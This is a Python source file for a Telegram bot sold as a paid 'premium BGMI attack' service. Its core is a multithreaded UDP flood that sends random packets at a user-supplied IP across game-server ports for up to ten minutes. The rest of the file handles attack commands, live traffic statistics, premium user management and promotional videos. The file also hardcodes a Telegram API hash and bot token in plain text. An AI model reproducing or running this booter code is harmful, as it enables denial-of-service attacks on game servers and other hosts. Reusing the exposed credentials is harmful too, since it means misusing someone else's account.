#!/usr/bin/env python3
"""
💎 PREMIUM BGMI ATTACK BOT - RAILWAY WORKING
"""

import asyncio, json, random, os, time, socket, threading, logging
from datetime import datetime
import pytz
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ═══════════ LOGGING ═══════════
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ═══════════ CONFIG ═══════════
API_ID = 35140329
API_HASH = "011f638e4acadee178c59afffc80193d"
BOT_TOKEN = "8603632286:AAEdNSOYN9IGUDV3mtweZ0jHqLg2keX7nbI"
OWNER_ID = 7614459746

IST = pytz.timezone('Asia/Kolkata')
LINE = "━━━━━━━━━━━━━━━━━━━"

# ═══════════ VIDEO DB ═══════════
VIDEO_DB = "videos.json"
USERS_DB = "users.json"
used_videos = []

def load_videos():
    try:
        if os.path.exists(VIDEO_DB):
            with open(VIDEO_DB) as f:
                return json.load(f)
    except: pass
    return []

def save_video(path):
    videos = load_videos()
    vid = len(videos) + 1
    videos.append({"id": vid, "path": path, "name": os.path.basename(path)})
    with open(VIDEO_DB, "w") as f:
        json.dump(videos, f)
    return vid

def get_random_video():
    global used_videos
    videos = load_videos()
    if not videos: return None
    avail = [v for v in videos if v["id"] not in used_videos]
    if not avail:
        used_videos.clear()
        avail = videos
    v = random.choice(avail)
    used_videos.append(v["id"])
    return v

def load_users():
    try:
        if os.path.exists(USERS_DB):
            with open(USERS_DB) as f:
                return json.load(f)
    except: pass
    return {"premium": []}

def is_premium(uid):
    users = load_users()
    return str(uid) in users.get("premium", []) or uid == OWNER_ID

# ═══════════ ATTACK ENGINE ═══════════
class Attack:
    def __init__(self):
        self.on = False
        self.pkts = 0
        self.bytes_out = 0
        self.lock = threading.Lock()
    
    def flood(self, ip, port, end):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        s.settimeout(0.001)
        ports = list(range(7000, 15000))
        while self.on and time.time() < end:
            try:
                for _ in range(10):
                    if not self.on: break
                    p = random.randbytes(random.randint(500, 1500))
                    s.sendto(p, (ip, random.choice(ports)))
                    with self.lock: self.pkts += 1; self.bytes_out += len(p)
            except: pass
        s.close()
    
    def start(self, ip, port, dur, threads):
        self.on = True; self.pkts = 0; self.bytes_out = 0
        end = time.time() + dur
        workers = [threading.Thread(target=self.flood, args=(ip, port, end)) for _ in range(threads)]
        for w in workers: w.daemon = True; w.start()
        time.sleep(dur); self.on = False
        elapsed = max(dur, 0.1)
        return {'pkts': self.pkts, 'mbps': (self.bytes_out*8)/(elapsed*1e6), 'mb': self.bytes_out/1024/1024}

attacker = Attack()
attacking = False
attack_info = {}
attack_msg = None

# ═══════════ BOT ═══════════
print("Starting bot...")
app = Client("attack_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

def get_time():
    return datetime.now(IST).strftime("%I:%M %p")

def keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💀 ATTACK", callback_data="attack"),
         InlineKeyboardButton("⛔ STOP", callback_data="stop")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status"),
         InlineKeyboardButton("👤 PROFILE", callback_data="profile")],
        [InlineKeyboardButton("🎬 VIDEO MENU", callback_data="video")],
        [InlineKeyboardButton("💎 PREMIUM", callback_data="premium"),
         InlineKeyboardButton("ℹ️ HELP", callback_data="help")],
    ])

# ═══════════ COMMANDS ═══════════

@app.on_message(filters.command("start"))
async def start_cmd(client, msg):
    user = msg.from_user
    vid = get_random_video()
    
    text = f"""
💎 **PREMIUM BGMI ATTACK BOT** 💎

{LINE}
👤 **{user.first_name}**
🆔 `{user.id}`
💳 {'💎 PREMIUM' if is_premium(user.id) else '🆓 FREE'}
{LINE}

⚔️ `/attack IP PORT TIME`
📋 `/attack 1.2.3.4 8080 120`

🔽 **Select Option:**
"""
    
    if vid and os.path.exists(vid["path"]):
        await client.send_video(msg.chat.id, vid["path"], caption=text, reply_markup=keyboard())
    else:
        await msg.reply_text(text, reply_markup=keyboard())

@app.on_message(filters.command("attack"))
async def attack_cmd(client, msg):
    global attacking, attack_info, attack_msg
    
    uid = msg.from_user.id
    
    if not is_premium(uid):
        return await msg.reply_text("💎 **PREMIUM ONLY!**\nContact owner for access.")
    
    if attacking:
        elapsed = time.time() - attack_info['start']
        return await msg.reply_text(f"⚠️ Already attacking! {int(elapsed)}s\n🛑 /stop")
    
    parts = msg.text.split()
    if len(parts) < 4:
        return await msg.reply_text("⚠️ `/attack IP PORT TIME`\n📋 `/attack 1.2.3.4 8080 120`")
    
    ip = parts[1]
    try: port = int(parts[2])
    except: return await msg.reply_text("❌ Invalid port!")
    try: dur = int(parts[3])
    except: return await msg.reply_text("❌ Invalid time!")
    
    threads = 5000 if is_premium(uid) else 500
    if dur > 600: dur = 600
    
    attack_info = {'ip': ip, 'port': port, 'time': dur, 'start': time.time()}
    attacking = True
    
    vid = get_random_video()
    start_text = f"💀 **ATTACK STARTED!**\n🎯 `{ip}:{port}`\n⏱️ `{dur}s`\n🧵 `{threads}` Threads"
    
    if vid and os.path.exists(vid["path"]):
        msg_obj = await client.send_video(msg.chat.id, vid["path"], caption=start_text)
    else:
        msg_obj = await msg.reply_text(start_text)
    
    attack_msg = msg_obj
    
    # Live updates
    async def live():
        t0 = time.time()
        while attacking:
            await asyncio.sleep(2)
            try:
                e = time.time() - t0
                if e >= dur: break
                r = dur - e
                pct = (e/dur)*100
                bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
                
                live_text = f"""
💀 **ATTACKING!** 💀
🎯 `{ip}:{port}`
⏱️ `{int(e)}s` / `{dur}s`
[{bar}] `{pct:.0f}%`
📦 `{attacker.pkts:,}` pkts | 📶 `{mbps:.1f}` Mbps
🛑 `/stop`
"""
                await attack_msg.edit_text(live_text)
            except: pass
    
    asyncio.create_task(live())
    
    # Run attack
    loop = asyncio.get_event_loop()
    stats = await loop.run_in_executor(None, attacker.start, ip, port, dur, threads)
    
    attacking = False
    
    done_text = f"""
✅ **ATTACK DONE!**
🎯 `{ip}:{port}`
⏱️ `{dur}s`
📦 `{stats['pkts']:,}` pkts
📶 `{stats['mbps']:.1f}` Mbps

🔄 `/attack IP PORT TIME`
"""
    
    vid = get_random_video()
    if vid and os.path.exists(vid["path"]):
        await client.send_video(msg.chat.id, vid["path"], caption=done_text)
    
    try:
        await attack_msg.edit_text(done_text)
    except: pass

@app.on_message(filters.command("stop"))
async def stop_cmd(client, msg):
    global attacking
    if attacking:
        attacker.on = False
        attacking = False
        await msg.reply_text("⛔ **STOPPED!**")
    else:
        await msg.reply_text("💤 No attack!")

@app.on_message(filters.command("status"))
async def status_cmd(client, msg):
    if attacking:
        e = time.time() - attack_info['start']
        mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
        await msg.reply_text(f"🟢 **ATTACKING!**\n⏱️ {int(e)}s\n📦 {attacker.pkts:,} pkts\n📶 {mbps:.1f} Mbps")
    else:
        await msg.reply_text("💤 **IDLE**")

@app.on_message(filters.command("addvideo"))
async def add_video_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    
    if msg.reply_to_message and msg.reply_to_message.video:
        s = await msg.reply_text("⏳ Downloading...")
        path = await msg.reply_to_message.download()
        vid = save_video(path)
        await s.edit_text(f"✅ Video #{vid} added! Total: {len(load_videos())}")
    else:
        await msg.reply_text("❌ Reply to a video!")

@app.on_message(filters.command("videos"))
async def list_videos_cmd(client, msg):
    videos = load_videos()
    if not videos:
        return await msg.reply_text("📹 No videos!")
    text = f"📹 **Videos ({len(videos)}):**\n\n"
    for v in videos[:10]:
        text += f"#{v['id']} {v['name'][:30]}\n"
    await msg.reply_text(text)

@app.on_message(filters.command("addpremium"))
async def add_prem_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.reply_text("/addpremium USER_ID")
    
    users = load_users()
    uid = parts[1]
    if uid not in users.get("premium", []):
        users.setdefault("premium", []).append(uid)
        with open(USERS_DB, "w") as f: json.dump(users, f)
        await msg.reply_text(f"✅ {uid} is now PREMIUM!")
    else:
        await msg.reply_text("Already premium!")

# ═══════════ CALLBACKS ═══════════
@app.on_callback_query()
async def callbacks(client, cb):
    data = cb.data
    uid = cb.from_user.id
    
    if data == "attack":
        await cb.message.edit_text("⚔️ `/attack IP PORT TIME`\n📋 `/attack 1.2.3.4 8080 120`")
    
    elif data == "stop":
        if attacking:
            attacker.on = False
            await cb.answer("⛔ Stopped!", show_alert=True)
        else:
            await cb.answer("💤 No attack", show_alert=True)
    
    elif data == "status":
        if attacking:
            e = time.time() - attack_info['start']
            await cb.answer(f"🟢 {int(e)}s | {attacker.pkts:,} pkts", show_alert=True)
        else:
            await cb.answer("💤 IDLE", show_alert=True)
    
    elif data == "profile":
        await cb.message.edit_text(
            f"👤 **PROFILE**\n\n🆔 `{uid}`\n👤 {cb.from_user.first_name}\n💳 {'💎 PREMIUM' if is_premium(uid) else '🆓 FREE'}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )
    
    elif data == "premium":
        await cb.message.edit_text(
            f"💎 **PREMIUM**\n\n⚡ 5000 Threads\n⏱️ 600s Max\n👑 Priority\n\n💰 ₹299/month",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )
    
    elif data == "video":
        await cb.message.edit_text(
            f"🎬 **VIDEO MENU**\n\n📹 Total: {len(load_videos())}\n\n📤 /addvideo (reply)\n📋 /videos",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )
    
    elif data == "help":
        await cb.message.edit_text(
            "ℹ️ **HELP**\n\n⚔️ /attack IP PORT TIME\n🛑 /stop\n📊 /status\n📹 /addvideo",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )
    
    elif data == "back":
        vid = get_random_video()
        text = f"💎 **MAIN MENU**\n\n👤 {cb.from_user.first_name}\n💳 {'💎 PREMIUM' if is_premium(uid) else '🆓 FREE'}\n\n🔽 Select:"
        
        if vid and os.path.exists(vid["path"]):
            await cb.message.delete()
            await client.send_video(cb.message.chat.id, vid["path"], caption=text, reply_markup=keyboard())
        else:
            await cb.message.edit_text(text, reply_markup=keyboard())

# ═══════════ INIT ═══════════
for f in [VIDEO_DB, USERS_DB]:
    if not os.path.exists(f):
        with open(f, "w") as fl: json.dump({} if f == USERS_DB else [], fl)

os.makedirs("downloads", exist_ok=True)

print("✅ Bot Ready!")
print("💎 Premium System Active")
print("💀 Attack System Ready")

if __name__ == "__main__":
    app.run()
